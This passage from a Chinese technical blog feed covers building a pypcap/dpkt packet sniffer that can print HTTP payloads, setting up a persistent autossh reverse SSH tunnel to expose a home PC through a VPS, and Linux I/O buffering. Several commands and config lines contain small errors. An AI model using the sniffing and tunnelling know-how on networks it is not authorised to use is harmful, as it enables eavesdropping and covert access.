<p>WinPcap has compatibility issues with Windows 10, therefore it&#39;s recommended to use Npcap (Nmap&#39;s packet sniffing library for Windows, based on the WinPcap/Libpcap libraries, but with improved speed, portability, security, and efficiency). Please enable WinPcap API-compatible mode during the library installation.</p>
</blockquote>
<p>这里提到<code>winpcap</code>与<code>win10</code>间存在兼容性问题，具体什么问题我也没搞清楚，之前使用<code>wireshark</code>抓包一直用的<code>winpcap</code>也没问题。不过我估计和后面要用到的<code>npcap sdk</code>有关吧。既如此，就需要在安装<code>pypcap</code>前安装好<code>Npcap</code>，并下载好<code>Npcap SDK</code>。</p>
<h3 id="下载文件"><a href="#下载文件" class="headerlink" title="下载文件"></a>下载文件</h3><ol>
<li><a href="https://github.com/pynetwork/pypcap/releases" target="_blank" rel="noopener">pypcap 源码</a></li>
<li><a href="https://nmap.org/npcap/#download" target="_blank" rel="noopener">Npcap</a></li>
<li><a href="https://nmap.org/npcap/#download" target="_blank" rel="noopener">Npcap SDK</a></li>
</ol>
<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><ul>
<li>安装Npcap</li>
</ul>
<p>安装下载后的Npcap安装包，如果电脑带有无线网卡，记得勾选“support raw 802.11 traffic(and monitor mode) for wireless adapters”。需要注意的是，如果电脑已经安装过<code>winpcap</code>软件，在安装<code>Npcap</code>时会弹窗提示卸载<code>Winpcap</code>,此时需要关闭wireshark或是其它相关的软件</p>
<ul>
<li>安装pypcap</li>
</ul>
<ol>
<li>将<code>Npcap SDK</code>文件夹和<code>pypcap</code>源码文件夹放在一个目录下</li>
<li>将<code>Npcap SDK</code>文件夹名称修改为<code>wpdpack</code></li>
<li>进入<code>pypcap</code>源码目录，执行<code>python setup.py install</code>即可完成安装</li>
</ol>
<p>在第三步需要注意的是，如果Python版本为3.7.2（其它大于3.7的版本没试过）有可能编译失败，因为有个头文件<code>pystate.h</code>在高版本会有更新，导致结构体<code>_ts PyThreadState</code>中的某些参数不识别，从而提示错误<code>pcap.c(22849): error C2039: &#39;exc_value&#39;: is not a member of &#39;_ts&#39;</code>等。之后我将版本换至3.6.6后便正常编译了。</p>
<p>安装完成后，可以进入<code>python</code>执行<code>import pcap</code>查看是否已经可以正常导入。</p>
<h2 id="简单使用"><a href="#简单使用" class="headerlink" title="简单使用"></a>简单使用</h2><pre><code class="python">import pcap

# list all of the Internet devices
devs = pcap.findalldevs()
print(*devs, sep=&#39;\n&#39;)

pc = pcap.pcap(devs[3], promisc=True, immediate=True, timeout_ms=50)
# fiter http pcakets
pc.setfilter(&#39;tcp port 80&#39;)
for ptime, pdata in pc:
    print(ptime, pdata)
</code></pre>
<p>接下来简单解释下几个主要函数</p>
<h3 id="findalldevs"><a href="#findalldevs" class="headerlink" title="findalldevs"></a>findalldevs</h3><p><code>findalldevs</code>可以列出当前操作系统的所有网络接口,但是<code>windows</code>和<code>Linux</code>的输出风格不大一样,下面来看看.</p>
<p>Linux版输出简单明了,若我猜的不错,输出的首个接口便是电脑的有线接口(本人台式机,Ubuntu系统),至少在我这是适用的.</p>
<pre><code class="zsh">➜ python
Python 3.6.7 (default, Oct 22 2018, 11:32:17)
[GCC 8.2.0] on linux
Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.
&gt;&gt;&gt; import pcap
&gt;&gt;&gt; pcap.findalldevs()
[&#39;enp2s0&#39;, &#39;any&#39;, &#39;lo&#39;, &#39;nflog&#39;, &#39;nfqueue&#39;, &#39;usbmon1&#39;, &#39;usbmon2&#39;]
&gt;&gt;&gt;
</code></pre>
<p>在<code>ubuntu</code>及大部分Linux系统中,均可使用<code>ip route</code>或是<code>ifconfig</code>来获取接口名，据此甚至可以自动获取接口名．</p>
<p>Windows版则比较复杂，下面是某台电脑<code>win10</code>操作系统输出的结果，这个直接看是看不出什么的, 因为使用<code>cmd</code>指令<code>ipconfig /all</code>输出的接口信息并不包含以下内容，而是接口名称及描述信息等，如果想知道下面接口如何与接口名对应起来，可以参考后面抓包工具使用注册表来获取接口信息,或是打开<code>wireshark</code>抓包，每个报文的帧头都会显示当前接口的接口信息．</p>
<pre><code class="zsh">&gt;&gt;&gt; import pcap
&gt;&gt;&gt; pcap.findalldevs()
[&#39;\Device\NPF_{839768E4-726A-48BB-9CEC-BD6FD670CB8F}&#39;, &#39;\Device\NPF_{C4D1AF17-C5C9-40C5-90F8-17781657FC9E}&#39;, &#39;\Device\NPF_{26024876-9711-428F-89D3-B91D2C488AC5}&#39;, &#39;\Device\NPF_{E26BFFEF-0644-4C13-8016-EB408AE1D471}&#39;, &#39;\Device\NPF_{9ED3674C-211E-4A57-923A-F8DBE6E6B704}&#39;, &#39;\Device\NPF_{A0B8B562-F309-44F3-95A1-BF34F5465925}&#39;, &#39;\Device\NPF_{9D76B006-6946-4C88-AED2-7F7A9194303C}&#39;]
</code></pre>
<h3 id="pcap-pcap"><a href="#pcap-pcap" class="headerlink" title="pcap.pcap"></a>pcap.pcap</h3><pre><code class="py">pc = pcap.pcap(devs[3], promisc=True, immediate=True, timeout_ms=50)
</code></pre>
<p>以上代码定义了一个pcap对象，首个参数<code>devs[3]</code>对应接口名，<code>promisc</code>为真代表打开混杂模式，<code>immediate</code>代表立即模式，启用将不缓存数据包,<code>timeout_ms</code>代表接收数据包的超时时间</p>
<h3 id="setfilter"><a href="#setfilter" class="headerlink" title="setfilter"></a>setfilter</h3><p><code>setfilter</code>用来设置数据包过滤器，比如只想抓<code>http</code>的包，那就通过<code>setfilter(tcp port 80)</code>实现，更加详细的过滤规则请自行谷歌．</p>
<h3 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h3><pre><code class="py">for ptime, pdata in pc:
    print(ptime, pdata)
</code></pre>
<p><code>pcap.pcap</code>对象pc是个动态数据，通常结合for循环或是while循环不断读取数据包，数据包会返回时间戳及报文数据．</p>
<p>上面这个小例子就是简单的说明<code>pcap</code>常用库函数的使用方法．具体的数据包的存储及解析需要由解析库<code>dpkt</code>来完成．下面是一个更加详细的抓包工具实例，可以完成数据包的抓取、解析及存储.</p>
<h2 id="简易抓包工具"><a href="#简易抓包工具" class="headerlink" title="简易抓包工具"></a>简易抓包工具</h2><pre><code class="python">#!/usr/bin/env python3
# -*- encoding:utf-8 -*-
import pcap
import dpkt

import getopt
import sys
import datetime
import time
import os
import platform

if &#39;Windows&#39; in platform.platform():
    import winreg as wr


IF_REG = r&#39;SYSTEM\CurrentControlSet\Control\Network\{4d36e972-e325-11ce-bfc1-08002be10318}&#39;
def getInterfaceByName(name):
    &#39;&#39;&#39;Get guid of interface from regedit of windows system

    Args:
        name: interface name

    Returns:
        An valid guid value or None.

    Example:
        getInterfaceByName(&#39;eth0&#39;)
    &#39;&#39;&#39;
    reg = wr.ConnectRegistry(None, wr.HKEY_LOCAL_MACHINE)
    reg_key = wr.OpenKey(reg, IF_REG)
    for i in range(wr.QueryInfoKey(reg_key)[0]):
        subkey_name = wr.EnumKey(reg_key, i)
        try:
            reg_subkey = wr.OpenKey(reg_key, subkey_name + r&#39;\Connection&#39;)
            Name = wr.QueryValueEx(reg_subkey, &#39;Name&#39;)[0]
            wr.CloseKey(reg_subkey)
            if Name == name:
                return r&#39;\Device\NPF_&#39; + subkey_name
        except FileNotFoundError as e:
            pass

    return None

def mac_addr(mac):
    return &#39;%02x:%02x:%02x:%02x:%02x:%02x&#39;%tuple(mac)

def ip_addr(ip):
    return &#39;%d.%d.%d.%d&#39;%tuple(ip)

def captureData(iface):
    pkt = pcap.pcap(iface, promisc=True, immediate=True, timeout_ms=50)
    # filter method
    filters = {
        &#39;DNS&#39;: &#39;udp port 53&#39;,
        &#39;HTTP&#39;: &#39;tcp port 80&#39;
    }
    # pkt.setfilter(filters[&#39;HTTP&#39;])

    pcap_filepath = &#39;pkts/pkts_{}.pcap&#39;.format(time.strftime(&quot;%Y%m%d-%H%M%S&quot;,
        time.localtime()))
    pcap_file = open(pcap_filepath, &#39;wb&#39;)
    writer = dpkt.pcap.Writer(pcap_file)
    print(&#39;Start capture...&#39;)
    try:
        pkts_count = 0
        for ptime, pdata in pkt:
            writer.writepkt(pdata, ptime)
            # anlysisData(pdata)
            printRawPkt(ptime, pdata)
            pkts_count += 1
    except KeyboardInterrupt as e:
        writer.close()
        pcap_file.close()
        if not pkts_count:
            os.remove(pcap_filepath)
        print(&#39;%d packets received&#39;%(pkts_count))

def printRawPkt(time, data):
    eth = dpkt.ethernet.Ethernet(data)
    print(&#39;Timestamp: &#39;, str(datetime.datetime.utcfromtimestamp(time)))
    print(&#39;Ethernet Frame: &#39;, mac_addr(eth.src), mac_addr(eth.dst))
    if not isinstance(eth.data, dpkt.ip.IP):
        print(&#39;&#39;)
        return

    ip = eth.data

    # get fragments info
    do_not_fragment = bool(ip.off &amp; dpkt.ip.IP_DF)
    more_fragments = bool(ip.off &amp; dpkt.ip.IP_MF)
    fragment_offset = ip.off &amp; dpkt.ip.IP_OFFMASK

    print(&#39;IP: %s -&gt; %s (len=%d ttl=%d DF=%d MF=%d offset=%d)\n&#39; % (
        ip_addr(ip.src), ip_addr(ip.dst), ip.len, ip.ttl,
        do_not_fragment, more_fragments, fragment_offset))

def anlysisData(data):
    packet = dpkt.ethernet.Ethernet(data)
    if isinstance(packet.data, dpkt.ip.IP):
        ip = ip_addr(packet.data.dst)
        if packet.data.data.dport == 80 or packet.data.data.sport == 80:
            try:
                print(packet.data.data.data.decode(&#39;utf-8&#39;, errors=&#39;ignore&#39;))
            except UnicodeDecodeError as uderr:
                print(uderr.__str__())


def main():
    if &#39;Windows&#39; in platform.platform():
        iface = getInterfaceByName(&#39;Router&#39;)
    else:
        iface = &#39;enp2s0&#39;
    captureData(iface)

if __name__ == &quot;__main__&quot;:
    main()
</code></pre>
<h3 id="简要说明"><a href="#简要说明" class="headerlink" title="简要说明"></a>简要说明</h3><ul>
<li>获取接口</li>
</ul>
<p><code>getInterfaceByName</code>根据接口名称,通过查找注册表信息获取<code>pcap</code>所需的接口设备信息,适用于Windows系统.至于Linux系统,直接通过<code>ifconfig</code>获取即可,至于自动获取功能,目前还没写,以后再说吧.</p>
<ul>
<li>数据包存储</li>
</ul>
<p>为了将数据包存储到<code>.pcap</code>文件(此类文件可以使用wireshark打开)中,可以通过<code>dpkt.pcap.Writer</code>对象使用<code>writepkt</code>函数不断写入文件.</p>
<pre><code class="py">pcap_file = open(pcap_filepath, &#39;wb&#39;)
writer = dpkt.pcap.Writer(pcap_file)
for ptime, pdata in pkt:
    writer.writepkt(pdata, ptime)
</code></pre>
<ul>
<li>打印数据包基本信息</li>
</ul>
<p><code>printRawPkt</code>是个非常简单的打印数据包基本信息的函数,最多仅打印至<code>ip</code>信息,打印格式如下:</p>
<pre><code class="yml">Timestamp:  2018-12-31 13:58:39.850904
Ethernet Frame:  00:e0:4c:5a:0a:78 00:0f:e9:61:30:00
IP: 192.168.1.76 -&gt; 59.111.160.197 (len=52 ttl=64 DF=1 MF=0 offset=0)
</code></pre>
<p>信息包含时间戳,以太网帧的<code>MAC</code>地址,<code>IP</code>地址及分片信息等.</p>
<ul>
<li>解析http数据包</li>
</ul>
<p><code>anlysisData</code>函数目前只是简单的检测及打印解码后的<code>http</code>包,使用<code>dpkt.ethernet.Ethernet</code>可以将原始数据包封装成一个结构化的以太网帧,之后按照网络协议栈的顺序便可逐层解析出链路层、网络层、传输层直至应用层.以上代码先是判断是否为<code>IP</code>报文,之后根据端口号判断是否为http报文,然后将数据解码后输出.</p>
<p>这个例子也很简单,很多异常情况也没考虑,本文主要目的是描述<code>pypcap</code>和<code>dpkt</code>的常用方法以及抓包工具的实现过程,至于针对具体协议的解析则需继续学习.</p>
<h3 id="抓包测试"><a href="#抓包测试" class="headerlink" title="抓包测试"></a>抓包测试</h3><pre><code class="zsh">➜ mkdir pkts
➜ sudo ./pktcap.py
Start capture...
Timestamp:  2018-12-31 13:58:37.148964
Ethernet Frame:  00:36:76:6c:28:fe 33:33:00:00:00:16

Timestamp:  2018-12-31 13:58:37.148978
Ethernet Frame:  00:36:76:6c:28:fe 33:33:00:00:00:16

Timestamp:  2018-12-31 13:58:37.529024
Ethernet Frame:  00:36:76:6c:28:fe 33:33:00:00:00:16

Timestamp:  2018-12-31 13:58:37.809011
Ethernet Frame:  98:e0:d9:a4:50:1d 33:33:00:00:00:16

Timestamp:  2018-12-31 13:58:39.850904
Ethernet Frame:  00:e0:4c:5a:0a:78 00:0f:e9:61:30:00
IP: 192.168.1.76 -&gt; 59.111.160.197 (len=52 ttl=64 DF=1 MF=0 offset=0)

Timestamp:  2018-12-31 13:58:39.862890
Ethernet Frame:  00:0f:e9:61:30:00 00:e0:4c:5a:0a:78
IP: 59.111.160.197 -&gt; 192.168.1.76 (len=40 ttl=55 DF=1 MF=0 offset=0)

Timestamp:  2018-12-31 13:58:40.289465
Ethernet Frame:  b0:19:c6:17:0a:57 33:33:00:00:00:16

Timestamp:  2018-12-31 13:58:40.369068
Ethernet Frame:  a4:d1:8c:0b:54:12 33:33:00:00:00:16

Timestamp:  2018-12-31 13:58:41.859034
Ethernet Frame:  a0:4e:a7:e0:65:3d 33:33:00:00:00:16

Timestamp:  2018-12-31 13:58:42.079218
Ethernet Frame:  8c:6d:50:7d:f9:fc ff:ff:ff:ff:ff:ff
IP: 0.0.0.0 -&gt; 255.255.255.255 (len=352 ttl=64 DF=0 MF=0 offset=0)

^C10 packets received
➜ cd pkts
➜ ls
pkts_20181230-185017.pcap  pkts_20181231-203416.pcap  pkts_20181231-215837.pcap
</code></pre>
<p>代码已上传至<a href="https://github.com/Litreily/Python-demos.git" target="_blank" rel="noopener">github Python-demos</a> <code>sniffer.py</code></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
<li><a href="https://www.cnblogs.com/jackadam/p/8279080.html" target="_blank" rel="noopener">windows 环境下python 安装 pypcap...</a></li>
<li><a href="https://www.cnblogs.com/xuanhun/p/5625186.html" target="_blank" rel="noopener">Python黑客编程3网络数据监听和过滤</a></li>
<li><a href="https://blog.csdn.net/weixin_39138707/article/details/74612637" target="_blank" rel="noopener">Mac下用python+pypcap+dpkt抓取IP数据包并分析</a></li>
</ol>
]]></content>
      
        <categories>
            
            <category> Python </category>
            
        </categories>
        
        
        <tags>
            
            <tag> pypcap </tag>
            
            <tag> dpkt </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[autossh反向代理实现内网穿透]]></title>
      <url>https://www.litreily.top/2018/11/25/autossh/</url>
      <content type="html"><![CDATA[<p>有时候需要在公司使用家里个人PC的一些资源，此时可以选择<code>Teamvieawer</code>进行远程，但是略微麻烦而且访问速率较慢，此时通过<code>vps</code>实现内网穿透就是个不错的想法。</p>
<p><img src="/assets/proxy/autossh_proxy.svg" alt="vps proxy"></p>
<p>本文讲述的内网穿透方法是通过<code>autossh</code>实现vps对内网的反向代理，在vps与内网之间建立一条长连接，使得外网PC通过vps的反向代理访问内网PC。整个实现所需的条件如下：</p>
<ol>
<li>带有公网IP(<code>222.222.222.222</code>)的vps</li>
<li>保持开机且联网的内网PC</li>
<li>任一联网的外网PC</li>
</ol>
<a id="more"></a>
<h2 id="vps配置"><a href="#vps配置" class="headerlink" title="vps配置"></a>vps配置</h2><p>修改vps的文件<code>/etc/ssh/sshd_config</code>, 取消以下参数的注释或是修改其值</p>
<pre><code class="yml">GetewayPorts yes
TCPKeepAlive yes
ClientAliveInterval 60
ClientAliveCountMax 3
</code></pre>
<h2 id="内网PC配置"><a href="#内网PC配置" class="headerlink" title="内网PC配置"></a>内网PC配置</h2><p>为了保证内网PC可以免密码访问vps，需要在vps添加内网PC的公钥</p>
<pre><code class="sh">$ ssh-keygen
# ... enter ...
$ ssh-copy-id -i ~/.ssh/id_rsa.pub -p 27000 root@222.222.222.222
# 27000是访问vps的端口号，root是vps的用户名，222.222.222.222是vps的公网IP
</code></pre>
<p>配置好后，在内网PC安装<code>autossh</code></p>
<pre><code class="sh">sudo apt-get install -y autossh
</code></pre>
<p>安装好以后，通过以上指令便可实现反向代理：</p>
<pre><code class="sh">autossh -p 27000 -M 27400 -NR &#39;*:27401:localhost:27402&#39; root@222.222.222.222
</code></pre>
<p>其中的参数：</p>
<ul>
<li><code>-p 27000</code>: vps ssh 端口，默认值22</li>
<li><code>-M 27440</code>: 中继服务器（vps）的代理服务监听端口，需保证不被vps其它进程占用</li>
<li><code>-NR &#39;*:27401:localhost:27402&#39;</code>: 端口映射，vps的<code>27401</code>端口映射到内网PC的<code>27402</code>端口</li>
<li><a href="mailto:`root@222.222.222.222" target="_blank" rel="noopener">`root@222.222.222.222</a>`: vps的用户名及IP</li>
</ul>
<p>这里涉及到4个端口，<code>27000</code>是vps ssh的监听端口，<code>27400</code>是vps代理服务的监听端口，<code>27401</code>和<code>27402</code>是vps与内网PC之间的一对端口映射，外网PC需要通过vps的<code>27401</code>端口访问内网。</p>
<h3 id="配置autossh服务"><a href="#配置autossh服务" class="headerlink" title="配置autossh服务"></a>配置autossh服务</h3><p>使用以上指令已经可以完成所需的功能了，但是每次开机都得重新输一遍，很不方便，所以可以把指令封装成一个服务，然后设置为开机启动。在<code>ubuntu</code>中，可以在<code>lib/systemd/system</code>目录下新建一个<code>autossh.service</code>的文件，并输入以下内容：</p>
<pre><code class="yml">[Unit]
Description=Auto SSH Tunnel
After=network-online.target
[Service]
User=autossh
Type=simple
ExecStart=/usr/bin/autossh -p 27000 -M 27400 -NR &#39;*:27401:localhost:27402&#39; root@222.222.222.222 -i ~/.ssh/id_rsa
ExecReload=/bin/kill -HUP $MAINPID
KillMode=process
StartLimitIntervalSec=5
StartLimitBurst=12
Restart=always
[Install]
WantedBy=multi-user.target
WantedBy=graphical.target
</code></pre>
<p>配置好后，通过以下指令完成启动、查询和自启动。</p>
<ul>
<li>启动服务：<code>sudo systemctl autossh start</code></li>
<li>查看状态：<code>sudo service autossh status</code></li>
<li>开机启动：<code>sudo systemctl enable autossh.service</code></li>
</ul>
<h2 id="远程访问内网"><a href="#远程访问内网" class="headerlink" title="远程访问内网"></a>远程访问内网</h2><p>最后就是如何通过外网访问内网了，其实和访问vps本身类似，仅仅是改一下连接端口即可。</p>
<pre><code class="sh">sudo ssh root@222.222.222.222 -p 27401
</code></pre>
<h2 id="扩展说明"><a href="#扩展说明" class="headerlink" title="扩展说明"></a>扩展说明</h2><p>本文介绍的是通过vps实现反向代理，如果没有vps的话就无法使用了，此时可以学习下<code>frp</code>或<code>Ngrok</code>，使用公共的服务器实现代理．</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://blog.windrunner.me/sa/reverse-ssh.html" target="_blank" rel="noopener">使用 autossh 建立反向 SSH 隧道管理个人计算机</a></li>
<li><a href="https://www.cnblogs.com/eshizhan/archive/2012/07/16/2592902.html" target="_blank" rel="noopener">SSH反向连接及Autossh</a></li>
</ul>
]]></content>
      
        <categories>
            
            <category> Network </category>
            
        </categories>
        
        
        <tags>
            
            <tag> ssh </tag>
            
            <tag> proxy </tag>
            
            <tag> vps </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Linux中的文件I/O缓冲]]></title>
      <url>https://www.litreily.top/2018/10/25/io-cache/</url>
      <content type="html"><![CDATA[<p>近日阅读《Linux/UNIX系统编程手册》第13章 - 文件I/O缓冲，有些收获，是以此文以记之。以往只知道Linux的I/O操作有缓冲机制，但始终不知道具体的缓冲流程及使用方法。读完本章节后方才有种恍然大悟的感觉，久违的因读书而觉得舒爽的感觉。</p>
<p>好了，进入正题，下图摘自原文(13.4-I/O缓冲小结)，此图概括了<code>stdio</code>库及内核针对输出文件所用的缓冲以及各类缓冲的控制机制。本文依据此图逐步揭开文件I/O缓冲的面纱。</p>
<p><img src="/assets/linux/io_buffer.jpg" alt="I/O缓冲"></p>
<a id="more"></a>
<h2 id="I-O缓冲的类型"><a href="#I-O缓冲的类型" class="headerlink" title="I/O缓冲的类型"></a>I/O缓冲的类型</h2><p>在使用<code>stdio</code>库中文件写操作相关的函数（如:<code>printf</code>, <code>fputc</code>, <code>fputs</code>, <code>fwrite</code>）时，待写入数据从用户空间内存到内核空间内存、再到磁盘会经过以下3类缓冲</p>
<ol>
<li>stdio库的缓冲区</li>
<li>文件I/O的内核缓冲区的高速缓存</li>
<li>磁盘驱动器内置高速缓存</li>
</ol>
<p>下面逐一介绍。</p>
<h3 id="stdio库的缓冲"><a href="#stdio库的缓冲" class="headerlink" title="stdio库的缓冲"></a>stdio库的缓冲</h3><p><img src="/assets/linux/stdio_buffer.png" alt="stdio buffer"></p>
<p>如上图所示，<code>stdio</code>库实现的缓冲位于用户空间内存当中，该缓冲区A会缓冲大块的文件数据以减少系统调用（如: <code>read</code>, <code>write</code>）。</p>
<p>需要知道的是，<code>stdio</code>库函数内部会调用底层的系统调用，如<code>fgets</code>调用<code>read</code>，<code>fputs</code>调用<code>write</code>。但是在调用之前，</p>
<ul>
<li>对于读操作，库函数会先检查缓冲区A内是否已有所需数据，如果有则直接从缓冲区A读取；否则先执行系统调用<code>read</code>，从内核缓冲区B中读取数据到缓冲区A，然后从缓冲区A读取数据</li>
<li>对于写操作，库函数会先检查缓冲区A是否还有空闲，如果有则先存入缓冲区A；否则先执行库函数<code>fflush</code>，将缓冲区A中数据刷新至内核缓冲区B，然后将当前待写入数据写入缓冲区A</li>
</ul>
<p>对于<code>stdio</code>库的缓冲数据，在执行库函数之后的某一时刻，系统会通过<code>fflush</code>函数将数据刷新至内核缓冲区。当然，我们也可以手动执行<code>fflush</code>函数强制刷新数据至内核缓冲区。</p>
<p><code>fflush</code>定义如下：</p>
<pre><code class="c">#include &lt;stdio.h&gt;
int fflush(FILE *stream);
</code></pre>
<ul>
<li><code>fflush(stdin)</code>会清空缓冲区内的标准输入数据</li>
<li><code>fflush(stdout)</code>会将缓冲区内的写入数据刷新至终端输出</li>
<li><code>stderr</code>默认不使用缓冲</li>
<li><code>fflush(stream)</code>将文件流<code>stream</code>的缓冲数据刷新至内核缓冲区</li>
</ul>
<h3 id="文件I-O的内核缓冲"><a href="#文件I-O的内核缓冲" class="headerlink" title="文件I/O的内核缓冲"></a>文件I/O的内核缓冲</h3><p>不管使不使用<code>stdio</code>库函数，最终都会直接或间接的调用<code>open</code>, <code>read</code>, <code>write</code>, <code>lseek</code>等系统调用读写文件I/O，那么系统就会在写操作后将数据存入内核缓冲区，但此时还并未存入磁盘。</p>
<p>也就是说，在执行<code>write</code>后，函数直接返回，但数据只是存在内核缓冲区中。当有新的读取请求时，会先在内核缓冲区中查找，如果有则直接返回；如果没有则先从磁盘读入大块数据至内核缓冲区，这样可以减少磁盘读写操作。毕竟，相比于系统调用和用户空间与内核空间之间的数据传输，磁盘读写所花费的时间要长得多。</p>
<blockquote>
<p>若内容发生变化的内核缓冲区在30s内未经显式方式同步到磁盘上，则一条长期运行的内核线程会确保将其刷新到磁盘上。</p>
</blockquote>
<p>不同版本的<code>linux</code>，其内核线程不一样，可以使用指令<code>ps aux |grep flush</code>粗略查看一下。</p>
<pre><code class="bash"># 查看内核线程刷新之前脏缓冲区必须达到的时间，单位：0.01s
$ cat /proc/sys/vm/dirty_expire_centisecs
3000

# 查看内核线程执行周期，单位：0.01s
$ cat /proc/sys/vm/dirty_writeback_centisecs
500
</code></pre>
<h3 id="磁盘驱动器内置缓冲"><a href="#磁盘驱动器内置缓冲" class="headerlink" title="磁盘驱动器内置缓冲"></a>磁盘驱动器内置缓冲</h3><p>内核缓冲区的数据在真正存入物理磁盘前，会先存入磁盘驱动器内置的高速缓存，之后在某一时刻写入磁盘。具体过程没有深究过，目前只需知道还有这么一层缓冲区即可。</p>
<h2 id="控制文件I-O缓冲"><a href="#控制文件I-O缓冲" class="headerlink" title="控制文件I/O缓冲"></a>控制文件I/O缓冲</h2><p>通过某些方式，我们可以控制I/O缓冲机制，其中包括修改缓冲区大小、缓冲模式，禁用缓冲，强制刷新缓冲数据等。</p>
<h3 id="控制stdio库的缓冲"><a href="#控制stdio库的缓冲" class="headerlink" title="控制stdio库的缓冲"></a>控制stdio库的缓冲</h3><p>对于<code>stdio</code>库分配的缓冲区，在默认情况下会分配<code>BUFSIZ</code>大小的缓冲区，该参数值的大小说法不一，但据原文说明，在<code>glibc</code>中定义为<code>8192</code>字节。</p>
<p><code>stdio</code>流的缓冲模式分以下三类：</p>
<ul>
<li><code>_IONBF</code> - 不缓冲</li>
<li><code>_IOLBF</code> - 行缓冲，针对终端设备，在输出一个换行符前缓冲数据。对输入流，每次读取一行数据</li>
<li><code>_IOFBF</code> - 全缓冲，单词读、写数据(read, write)的大小与缓冲区大小一致，磁盘默认使用此模式</li>
</ul>
<p>我们可以通过库函数<code>setvbuf</code>, <code>setbuffer</code>, <code>setbuf</code>三者之一设置<code>stdio</code>流的缓冲模式。</p>
<pre><code class="c">#include &lt;stdio.h&gt;
void setbuf(FILE *stream, char *buf);
void setbuffer(FILE *stream, char *buf, size_t size);
int setvbuf(FILE *stream, char *buf, int mode, size_t size);
</code></pre>
<p><code>setvbuf</code>函数中的mode对应的就是缓冲模式，可选项为<code>_IONBF</code>, <code>_IOLBF</code>, <code>_IOFBF</code>，<code>buf</code>和<code>size</code>分别对应指定的缓冲区指针及缓冲区大小。当然，当为不缓冲模式时，函数将忽略<code>buf</code>，<code>size</code>这两个参数。示例如下：</p>
<pre><code class="c">#define BUF_SIZE 4096
static char buf[BUF_SIZE];
FILE *fp;

fp = fopen(&quot;test.txt&quot;, &#39;w&#39;);
if(setvbuf(fp, buf, _IOFBF, BUF_SIZE) !=0 )
    exit(EXIT_FAILURE);
</code></pre>
<p>从下面的<code>uClibc</code>源码可以看出，<code>setbuffer</code>, <code>setbuf</code>仅仅是对<code>setvbuf</code>的简单封装。但要注意的是，<code>SUSv3</code>标准并未对<code>setbuffer</code>函数加以定义，在使用时需要加上宏定义<code>_BSD_SOURCE</code>。</p>
<pre><code class="c">void setbuffer(FILE * __restrict stream, register char * __restrict buf, size_t size)
{
#ifdef __STDIO_BUFFERS
    setvbuf(stream, buf, (buf ? _IOFBF : _IONBF), size);
#endif
}

void setbuf(FILE * __restrict stream, register char * __restrict buf)
{
#ifdef __STDIO_BUFFERS
    setvbuf(stream, buf, ((buf != NULL) ? _IOFBF : _IONBF), BUFSIZ);
#endif
}
</code></pre>
<p>如果想要禁用缓冲，通常可以使用<code>setbuf(stream, NULL)</code>实现。但通常不推荐这么做，应该合理组织代码，在特定情况使用<code>fflush</code>刷新数据，这样可以在有效利用用户空间缓冲作用的同时，减少系统调用，适宜的存储数据至内核缓冲区。</p>
<h3 id="控制文件I-O的内核缓冲"><a href="#控制文件I-O的内核缓冲" class="headerlink" title="控制文件I/O的内核缓冲"></a>控制文件I/O的内核缓冲</h3><p>在某些情况下，我们可能需要强制将内核缓冲区内的数据刷新至磁盘，而不必等待内核线程等待特定时间后才写入。此时主要有两种选择</p>
<ol>
<li>使用<code>fsync</code>，<code>fdatasync</code>, <code>sync</code>系统调用中的某一个将内核缓冲区的数据强制写入磁盘</li>
<li>以<code>O_SYNC</code>同步方式调用<code>open</code>打开文件，此后每次读写操作都会自动立即写入磁盘</li>
</ol>
<h4 id="fsync"><a href="#fsync" class="headerlink" title="fsync"></a>fsync</h4><pre><code class="c">#include &lt;unistd.h&gt;
int fsync(int fd);
int fdatasync(int fd);
void sync(void);
</code></pre>
<p><code>fsync</code>保证<strong>同步I/O文件完整性</strong>，<code>fdatasync</code>保证<strong>同步I/O数据完整性</strong>。两个<strong>完整性</strong>的区别在于前者会将所有更新的文件元数据写入磁盘，后者不会传递所有经过修改的文件元数据属性（如：时间戳）。</p>
<p><code>fsync</code>与<code>fdatasync</code>均是刷新指定文件流数据，而<code>sync()</code>函数会更新所有内核缓冲区数据至磁盘，对应<code>shell</code>指令<code>sync</code>。</p>
<h4 id="O-SYNC"><a href="#O-SYNC" class="headerlink" title="O_SYNC"></a>O_SYNC</h4><p><code>fsync</code>等系统调用需要被手动调用，仅在被调用处起作用；而以<code>O_SYNC</code>方式<code>open</code>的文件流，后续所有写操作都将把数据直接写入磁盘。</p>
<p>不到万不得已还是不要以这种方式打开文件流，因为这将严重影响性能，当<code>write</code>缓冲区较小时尤为突出。</p>
<h3 id="禁用磁盘高速缓存"><a href="#禁用磁盘高速缓存" class="headerlink" title="禁用磁盘高速缓存"></a>禁用磁盘高速缓存</h3><p>按照书上描述，使用<code>hdparm -W0</code>可以禁用磁盘上的高速缓存，但我没有实际试过。</p>
<h3 id="直接I-O"><a href="#直接I-O" class="headerlink" title="直接I/O"></a>直接I/O</h3><p>当以<code>O_DIRECT</code>方式<code>open</code>文件流时，数据流会绕过内核缓冲区高速缓存，从用户空间直接传入文件或磁盘，此类过程称为<strong>直接I/O</strong>。</p>
<p>使用直接I/O对I/O操作有诸多对齐限制，主要保证读取和写入时，偏移量、数据长度以及内存边界需要是块设备基本单元(通常为512字节)的整数倍，否则会导致<code>EINVAL</code>错误。</p>
<p>使用直接I/O时，可以结合<code>memalign</code>函数动态分配内存。</p>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>使用<code>stdio</code>库函数可以利用该库实现的用户空间缓冲区减少系统调用；<code>read</code>，<code>write</code>等系统调用默认不与磁盘直接传递数据，而是经过文件I/O的内核缓冲区作为中转，以此减少磁盘操作。</p>
<p>通过<code>fflush</code>函数可以将<code>stdio</code>流的缓冲区数据刷新至内核缓冲区；通过<code>fsync</code>, <code>fdatasync</code>函数可以将内核缓冲区数据刷新至磁盘。</p>
